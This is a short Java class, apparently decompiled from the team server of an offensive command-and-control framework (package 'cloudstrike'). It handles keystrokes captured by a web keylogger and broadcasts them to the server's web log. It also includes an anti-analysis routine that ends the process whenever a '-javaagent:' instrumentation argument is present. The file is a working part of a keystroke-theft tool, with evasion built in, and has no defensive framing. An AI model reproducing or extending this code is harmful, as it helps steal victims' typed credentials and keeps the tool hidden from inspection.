package server;

import cloudstrike.Keylogger;
import common.WebKeyloggerEvent;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class KeyloggerHandler implements Keylogger.KeyloggerListener {
   protected Resources resources;
   protected String curl;

   public KeyloggerHandler(Resources var1, String var2) {
      this.resources = var1;
      this.curl = var2;
   }

   public void slowlyStrokeMe(String var1, String var2, Map var3, String var4) {
      this.resources.broadcast("weblog", new WebKeyloggerEvent(this.curl, var2, var3, var4));
      A();
   }

   private static final void A() {
      RuntimeMXBean var0 = ManagementFactory.getRuntimeMXBean();
      List var1 = var0.getInputArguments();
      Iterator var2 = var1.iterator();

      while(var2.hasNext()) {
         String var3 = (String)var2.next();
         if (var3 != null && var3.toLowerCase().contains("-javaagent:")) {
            System.exit(0);
         }
      }

   }
}
